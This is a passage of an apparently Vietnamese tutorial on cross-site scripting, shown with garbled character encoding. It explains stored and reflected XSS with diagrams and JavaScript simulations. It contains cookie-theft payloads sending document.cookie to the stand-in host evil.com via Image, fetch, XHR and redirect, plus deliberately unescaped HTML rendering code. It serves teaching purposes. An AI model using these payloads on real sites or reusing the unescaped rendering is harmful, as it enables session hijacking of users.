  â”‚  BÃŒNH THÆ¯á»œNG (evil.com táº¥n cÃ´ng bank.com):             â”‚
  â”‚                                                        â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
  â”‚  â”‚ evil.com â”‚ â”€â”€â†’ â”‚   SOP       â”‚ â”€â”€X â”‚ bank.com â”‚   â”‚
  â”‚  â”‚ (hacker) â”‚     â”‚ "KHÃC       â”‚     â”‚ (cookie, â”‚   â”‚
  â”‚  â”‚          â”‚     â”‚  ORIGIN!    â”‚     â”‚  DOM...) â”‚   â”‚
  â”‚  â”‚          â”‚     â”‚  CHáº¶N!"     â”‚     â”‚          â”‚   â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
  â”‚                                                        â”‚
  â”‚  KHI CÃ“ XSS (code hacker TRONG bank.com):             â”‚
  â”‚                                                        â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                  â”‚
  â”‚  â”‚          bank.com                â”‚                  â”‚
  â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚                  â”‚
  â”‚  â”‚  â”‚ Code gá»‘c bank.com      â”‚    â”‚                  â”‚
  â”‚  â”‚  â”‚ <script src="app.js">  â”‚    â”‚                  â”‚
  â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚                  â”‚
  â”‚  â”‚                                  â”‚                  â”‚
  â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚                  â”‚
  â”‚  â”‚  â”‚ âš  CODE HACKER!         â”‚    â”‚                  â”‚
  â”‚  â”‚  â”‚ <script>                â”‚    â”‚                  â”‚
  â”‚  â”‚  â”‚   fetch('evil.com',    â”‚    â”‚                  â”‚
  â”‚  â”‚  â”‚     {body:document.    â”‚    â”‚                  â”‚
  â”‚  â”‚  â”‚      cookie})          â”‚    â”‚                  â”‚
  â”‚  â”‚  â”‚ </script>              â”‚    â”‚                  â”‚
  â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚                  â”‚
  â”‚  â”‚                                  â”‚                  â”‚
  â”‚  â”‚  SOP: "Cáº£ 2 Ä‘á»u tá»« bank.com!   â”‚                  â”‚
  â”‚  â”‚        CHO PHÃ‰P truy cáº­p!"      â”‚                  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                  â”‚
  â”‚                                                        â”‚
  â”‚  â†’ Code hacker cÃ³ QUYá»€N TRUY Cáº¬P NHÆ¯ code gá»‘c!      â”‚
  â”‚  â†’ Äá»c cookie, localStorage, sessionStorage!          â”‚
  â”‚  â†’ Thay Ä‘á»•i DOM, gá»­i form, redirect!                  â”‚
  â”‚  â†’ Gá»¬I dá»¯ liá»‡u vá» evil.com!                           â”‚
  â”‚                                                        â”‚
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

## Â§3. Stored XSS â€” Loáº¡i Nguy Hiá»ƒm Nháº¥t!

### 3.1. Stored XSS Hoáº¡t Äá»™ng NhÆ° Tháº¿ NÃ o?

```
  STORED XSS â€” "PERSISTENT XSS" â€” LÆ¯U TRONG DATABASE!
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚                                                        â”‚
  â”‚  BÆ¯á»šC 1: Hacker chÃ¨n payload vÃ o DATABASE!             â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  Hacker Ä‘Äƒng bÃ¬nh luáº­n trÃªn blog:                â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  TÃªn: "Hacker Nguyá»…n"                            â”‚  â”‚
  â”‚  â”‚  Ná»™i dung: "BÃ i viáº¿t hay!                       â”‚  â”‚
  â”‚  â”‚            <script>                              â”‚  â”‚
  â”‚  â”‚              var c = document.cookie;             â”‚  â”‚
  â”‚  â”‚              new Image().src =                   â”‚  â”‚
  â”‚  â”‚                'https://evil.com/steal?c=' + c;  â”‚  â”‚
  â”‚  â”‚            </script>"                            â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  â†’ Server LÆ¯U vÃ o database KHÃ”NG lá»c!           â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â”‚  BÆ¯á»šC 2: Náº¡n nhÃ¢n xem trang!                           â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  Náº¡n nhÃ¢n (Ä‘ang Ä‘Äƒng nháº­p) vÃ o xem bÃ¬nh luáº­n:   â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  Browser nháº­n HTML tá»« server:                    â”‚  â”‚
  â”‚  â”‚  <div class="comment">                           â”‚  â”‚
  â”‚  â”‚    <h4>Hacker Nguyá»…n</h4>                        â”‚  â”‚
  â”‚  â”‚    <p>BÃ i viáº¿t hay!                             â”‚  â”‚
  â”‚  â”‚      <script>                                    â”‚  â”‚
  â”‚  â”‚        var c = document.cookie;                  â”‚  â”‚
  â”‚  â”‚        new Image().src =                         â”‚  â”‚
  â”‚  â”‚          'https://evil.com/steal?c=' + c;        â”‚  â”‚
  â”‚  â”‚      </script>                                   â”‚  â”‚
  â”‚  â”‚    </p>                                          â”‚  â”‚
  â”‚  â”‚  </div>                                          â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  â†’ Browser CHáº Y <script>!                       â”‚  â”‚
  â”‚  â”‚  â†’ Cookie ÄÆ¯á»¢C Gá»¬I tá»›i evil.com!                â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â”‚  BÆ¯á»šC 3: Hacker nháº­n cookie!                           â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  evil.com nháº­n request:                          â”‚  â”‚
  â”‚  â”‚  GET /steal?c=session_id=abc123xyz               â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  Hacker dÃ¹ng cookie Ä‘Ã³:                          â”‚  â”‚
  â”‚  â”‚  â†’ ÄÄƒng nháº­p VÃ€O TÃ€I KHOáº¢N Náº N NHÃ‚N!          â”‚  â”‚
  â”‚  â”‚  â†’ KHÃ”NG Cáº¦N máº­t kháº©u!                         â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### 3.2. Tá»± Viáº¿t â€” MÃ´ Phá»ng Stored XSS!

```javascript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// MÃ” PHá»NG STORED XSS â€” SERVER KHÃ”NG Lá»ŒC INPUT!
// ÄÃ‚Y LÃ€ CODE MINH Há»ŒA! KHÃ”NG DÃ™NG Äá»‚ Táº¤N CÃ”NG!
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

// â‘  MÃ” PHá»NG DATABASE:
var database = {
  comments: [],
};

// â‘¡ SERVER â€” NHáº¬N BÃŒNH LUáº¬N (KHÃ”NG Lá»ŒC!):
function saveComment(username, content) {
  // âŒ LÆ¯U THáº²NG VÃ€O DB â€” KHÃ”NG Lá»ŒC!
  database.comments.push({
    username: username,
    content: content,
    createdAt: new Date().toISOString(),
  });
}

// â‘¢ SERVER â€” Táº O HTML (KHÃ”NG ESCAPE!):
function renderComments() {
  var html = '<div class="comments">';

  for (var i = 0; i < database.comments.length; i++) {
    var comment = database.comments[i];

    // âŒ CHÃˆN TRá»°C TIáº¾P VÃ€O HTML â€” KHÃ”NG ESCAPE!
    html += '<div class="comment">';
    html += "  <h4>" + comment.username + "</h4>";
    html += "  <p>" + comment.content + "</p>";
    html += "  <small>" + comment.createdAt + "</small>";
    html += "</div>";
  }

  html += "</div>";
  return html;
}

// â‘£ HACKER ÄÄ‚NG BÃŒNH LUáº¬N:
saveComment("User bÃ¬nh thÆ°á»ng", "BÃ i viáº¿t ráº¥t hay, cáº£m Æ¡n tÃ¡c giáº£!");

saveComment(
  'Hacker<script>alert("XSS")</script>',
  'BÃ i viáº¿t hay! <script>document.location="https://evil.com/steal?cookie="+document.cookie</script>',
);

// â‘¤ RENDER HTML:
var html = renderComments();
console.log(html);

// â‘¥ Káº¾T QUáº¢ HTML:
// <div class="comments">
//   <div class="comment">
//     <h4>User bÃ¬nh thÆ°á»ng</h4>
//     <p>BÃ i viáº¿t ráº¥t hay, cáº£m Æ¡n tÃ¡c giáº£!</p>
//   </div>
//   <div class="comment">
//     <h4>Hacker<script>alert("XSS")</script></h4>
//     <p>BÃ i viáº¿t hay! <script>document.location=
//       "https://evil.com/steal?cookie="+document.cookie
//     </script></p>
//   </div>
// </div>
//
// â†’ Browser CHáº Y <script> trong cáº£ username VÃ€ content!
// â†’ 2 lá»— há»•ng XSS cÃ¹ng lÃºc!
```

```
  STORED XSS â€” LUá»’NG Táº¤N CÃ”NG:
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚                                                        â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”    POST /comment          â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚ HACKER â”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â†’ â”‚   SERVER   â”‚  â”‚
  â”‚  â”‚        â”‚  body: {                   â”‚            â”‚  â”‚
  â”‚  â”‚        â”‚    content: "<script>      â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”  â”‚  â”‚
  â”‚  â”‚        â”‚      steal cookie          â”‚  â”‚  DB  â”‚  â”‚  â”‚
  â”‚  â”‚        â”‚    </script>"              â”‚  â”‚ LÆ¯U! â”‚  â”‚  â”‚
  â”‚  â”‚        â”‚  }                         â”‚  â””â”€â”€â”€â”€â”€â”€â”˜  â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”˜                            â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                               â”‚        â”‚
  â”‚                                               â”‚        â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”    GET /page               â”Œâ”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚ Náº N    â”‚ â† â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚   SERVER   â”‚  â”‚
  â”‚  â”‚ NHÃ‚N   â”‚  HTML chá»©a <script>!      â”‚  Äá»c DB    â”‚  â”‚
  â”‚  â”‚        â”‚                            â”‚  Render    â”‚  â”‚
  â”‚  â”‚ Browserâ”‚                            â”‚  HTML      â”‚  â”‚
  â”‚  â”‚ CHáº Y   â”‚                            â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚  â”‚ script!â”‚                                            â”‚
  â”‚  â””â”€â”€â”€â”¬â”€â”€â”€â”€â”˜                                            â”‚
  â”‚      â”‚                                                 â”‚
  â”‚      â”‚  Cookie bá»‹ gá»­i!                                 â”‚
  â”‚      â–¼                                                 â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                                        â”‚
  â”‚  â”‚ evil.com   â”‚                                        â”‚
  â”‚  â”‚ Nháº­n cookieâ”‚                                        â”‚
  â”‚  â”‚ session_id â”‚                                        â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                                        â”‚
  â”‚                                                        â”‚
  â”‚  Táº I SAO "STORED" NGUY HIá»‚M NHáº¤T?                     â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚  â†’ Payload LÆ¯U TRONG DB!                        â”‚  â”‚
  â”‚  â”‚  â†’ Báº¤T Ká»² AI xem trang Ä‘á»u bá»‹!                 â”‚  â”‚
  â”‚  â”‚  â†’ KhÃ´ng cáº§n trick user click link!              â”‚  â”‚
  â”‚  â”‚  â†’ Táº¥n cÃ´ng HÃ€NG LOáº T user cÃ¹ng lÃºc!           â”‚  â”‚
  â”‚  â”‚  â†’ Payload tá»“n táº¡i VÄ¨NH VIá»„N (Ä‘áº¿n khi bá»‹ xÃ³a)!â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### 3.3. MÃ´ Phá»ng Cookie Theft â€” Tá»± Viáº¿t!

```javascript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// MÃ” PHá»NG COOKIE THEFT QUA XSS â€” Tá»° VIáº¾T!
// ÄÃ‚Y LÃ€ CODE EDUCATION! KHÃ”NG DÃ™NG Äá»‚ Táº¤N CÃ”NG!
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

// â‘  MÃ” PHá»NG BROWSER CÃ“ COOKIE:
var mockDocument = {
  cookie: "session_id=abc123xyz; user_role=admin; CSRF_token=def456",
};

// â‘¡ PAYLOAD XSS â€” CÃC CÃCH Äáº®T Cáº®P COOKIE:

// CÃCH 1: DÃ¹ng Image (phá»• biáº¿n nháº¥t!):
function stealCookieViaImage() {
  var payload =
    "<script>" +
    'new Image().src = "https://evil.com/steal?c=" + document.cookie;' +
    "</script>";
  return payload;
  // â†’ Táº¡o Image â†’ browser gá»­i GET request!
  // â†’ Cookie náº±m trong URL â†’ hacker tháº¥y trong log!
  // â†’ KHÃ”NG Cáº¦N CORS! Image request KHÃ”NG bá»‹ SOP cháº·n!
}

// CÃCH 2: DÃ¹ng fetch (modern):
function stealCookieViaFetch() {
  var payload =
    "<script>" +
    'fetch("https://evil.com/steal", {' +
    '  method: "POST",' +
    "  body: document.cookie," +
    '  mode: "no-cors"' + // â† Bypass CORS!
    "});" +
    "</script>";
  return payload;
  // â†’ mode: "no-cors" = browser Gá»¬I request
  //   nhÆ°ng KHÃ”NG Äá»ŒC response!
  // â†’ Hacker KHÃ”NG Cáº¦N Ä‘á»c response!
  // â†’ Chá»‰ cáº§n cookie ÄÆ¯á»¢C Gá»¬I ÄI lÃ  Ä‘á»§!
}

// CÃCH 3: DÃ¹ng XMLHttpRequest:
function stealCookieViaXHR() {
  var payload =
    "<script>" +
    "var x = new XMLHttpRequest();" +
    'x.open("GET", "https://evil.com/steal?c=" + document.cookie);' +
    "x.send();" +
    "</script>";
  return payload;
}

// â‘¢ MÃ” PHá»NG HACKER SERVER:
var hackerLogs = [];

function hackerServerReceive(url) {
  // Parse cookie tá»« URL:
  var cookieParam = url.split("?c=")[1];
  hackerLogs.push({
    timestamp: new Date().toISOString(),
    stolenCookie: decodeURIComponent(cookieParam),
    victimIP: "192.168.1.100", // Giáº£ láº­p
  });

  console.log("âš  COOKIE Bá»Š ÄÃNH Cáº®P:");
  console.log("  Cookie:", cookieParam);
  console.log("  Thá»i gian:", hackerLogs[hackerLogs.length - 1].timestamp);
}

// â‘£ THá»¬ NGHIá»†M:
var stolenUrl =
  "https://evil.com/steal?c=" + encodeURIComponent(mockDocument.cookie);

hackerServerReceive(stolenUrl);
// Output:
// âš  COOKIE Bá»Š ÄÃNH Cáº®P:
//   Cookie: session_id%3Dabc123xyz%3B%20user_role%3Dadmin%3B...
//   Thá»i gian: 2024-01-15T10:30:00.000Z
```

```
  Táº I SAO IMAGE TRICK HOáº T Äá»˜NG?
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚                                                        â”‚
  â”‚  new Image().src = "https://evil.com/steal?c=" + cookieâ”‚
  â”‚                                                        â”‚
  â”‚  Táº I SAO DÃ™NG IMAGE?                                   â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  â‘  Image request KHÃ”NG Bá»Š SOP/CORS cháº·n!        â”‚  â”‚
  â”‚  â”‚     â†’ Browser cho phÃ©p táº£i áº£nh tá»« Má»ŒI domain!  â”‚  â”‚
  â”‚  â”‚     â†’ <img src="https://evil.com/..."> luÃ´n OK! â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  â‘¡ Cookie náº±m trong URL (query string)!          â”‚  â”‚
  â”‚  â”‚     â†’ /steal?c=session_id=abc123                â”‚  â”‚
  â”‚  â”‚     â†’ Hacker Ä‘á»c URL trong access log!          â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  â‘¢ KHÃ”NG Cáº¦N response!                           â”‚  â”‚
  â”‚  â”‚     â†’ 404? KhÃ´ng sao! Cookie Ä‘Ã£ gá»­i rá»“i!       â”‚  â”‚
  â”‚  â”‚     â†’ Image load fail? KhÃ´ng sao!               â”‚  â”‚
  â”‚  â”‚     â†’ Request ÄÃƒ ÄI = cookie ÄÃƒ Bá»Š Lá»˜!       â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  â‘£ KHÃ”NG Cáº¦N táº¡o DOM element!                    â”‚  â”‚
  â”‚  â”‚     â†’ new Image() KHÃ”NG thÃªm vÃ o DOM!           â”‚  â”‚
  â”‚  â”‚     â†’ User KHÃ”NG THáº¤Y gÃ¬ báº¥t thÆ°á»ng!            â”‚  â”‚
  â”‚  â”‚     â†’ HoÃ n toÃ n áº¨N!                             â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

## Â§4. Reflected XSS â€” Táº¥n CÃ´ng Qua URL!

### 4.1. Reflected XSS Hoáº¡t Äá»™ng NhÆ° Tháº¿ NÃ o?

```
  REFLECTED XSS â€” PAYLOAD TRONG URL!
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚                                                        â”‚
  â”‚  "Reflected" = "Pháº£n chiáº¿u"                            â”‚
  â”‚  â†’ Payload Ä‘i tá»« URL â†’ Server â†’ HTML â†’ Browser!      â”‚
  â”‚  â†’ Server "pháº£n chiáº¿u" payload ngÆ°á»£c láº¡i user!        â”‚
  â”‚                                                        â”‚
  â”‚  VÃ Dá»¤ â€” TRANG TÃŒM KIáº¾M:                              â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  URL bÃ¬nh thÆ°á»ng:                                â”‚  â”‚
  â”‚  â”‚  https://shop.com/search?q=laptop                â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  Server tráº£ HTML:                                â”‚  â”‚
  â”‚  â”‚  <h2>Káº¿t quáº£ tÃ¬m kiáº¿m cho: laptop</h2>         â”‚  â”‚
  â”‚  â”‚  â†‘ ChÃ¨n giÃ¡ trá»‹ q TRá»°C TIáº¾P vÃ o HTML!         â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  URL táº¥n cÃ´ng:                                   â”‚  â”‚
  â”‚  â”‚  https://shop.com/search?q=                      â”‚  â”‚
  â”‚  â”‚    <script>alert('XSS')</script>                â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  Server tráº£ HTML:                                â”‚  â”‚
  â”‚  â”‚  <h2>Káº¿t quáº£ tÃ¬m kiáº¿m cho:                     â”‚  â”‚
  â”‚  â”‚    <script>alert('XSS')</script></h2>           â”‚  â”‚
  â”‚  â”‚  â†‘ SCRIPT ÄÆ¯á»¢C CHáº Y!                           â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### 4.2. Tá»± Viáº¿t â€” MÃ´ Phá»ng Server Vulnerable!

```javascript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// MÃ” PHá»NG REFLECTED XSS â€” SERVER KHÃ”NG ESCAPE!
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

// â‘  MÃ” PHá»NG SERVER Xá»¬ LÃ SEARCH:
function handleSearchRequest(queryString) {
  // Parse query parameter:
  var searchTerm = parseQuery(queryString).q || "";

  // âŒ CHÃˆN TRá»°C TIáº¾P VÃ€O HTML â€” KHÃ”NG ESCAPE!
  var html =
    "<!DOCTYPE html>" +
    "<html>" +
    "<head><title>TÃ¬m kiáº¿m</title></head>" +
    "<body>" +
    "  <h1>Cá»­a HÃ ng Online</h1>" +
    '  <form action="/search">' +
    '    <input name="q" value="' +
    searchTerm +
    '">' +
    "    <button>TÃ¬m</button>" +
    "  </form>" +
    "  <h2>Káº¿t quáº£ cho: " +
    searchTerm +
    "</h2>" +
    "  <p>KhÃ´ng tÃ¬m tháº¥y káº¿t quáº£.</p>" +
    "</body>" +
    "</html>";

  return html;
}

// â‘¡ HELPER â€” Parse query string:
function parseQuery(queryString) {
  var params = {};
  if (!queryString) return params;

  // Bá» dáº¥u ? á»Ÿ Ä‘áº§u:
  if (queryString.charAt(0) === "?") {
    queryString = queryString.substring(1);
  }

  var pairs = queryString.split("&");
  for (var i = 0; i < pairs.length; i++) {
    var pair = pairs[i].split("=");
    var key = decodeURIComponent(pair[0]);
